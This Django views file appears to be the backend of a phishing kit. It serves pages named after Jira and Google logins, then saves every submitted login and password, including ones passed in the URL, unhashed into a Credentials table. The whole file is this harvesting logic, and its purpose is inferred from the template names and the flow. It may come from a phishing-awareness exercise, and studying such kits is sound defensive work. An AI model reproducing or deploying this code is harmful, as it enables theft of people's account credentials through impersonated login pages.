from django.http import HttpResponseRedirect
from django.shortcuts import render
from .models import Credentials
# Create your views here.
def general(request):
    return render(request, 'jira.html')

def google_sheet(request):
    return render(request, 'google.html')

def google_sheet2(request, login="unknown", password="unknown"):
    print("login", login)
    if login == "unknown":
        return HttpResponseRedirect("/templates/google/")
    if password != "unknown":
        jira_cred = Credentials()
        jira_cred.login = login
        jira_cred.password = password
        jira_cred.save()
        return HttpResponseRedirect('/templates/google/')
    
    return render(request, 'google2.html', {"login":login})

def create(request):
    if request.method == 'POST':
        jira_cred = Credentials()
        jira_cred.login = request.POST.get("login")
        jira_cred.password = request.POST.get("password")
        jira_cred.save()
    return HttpResponseRedirect('/')
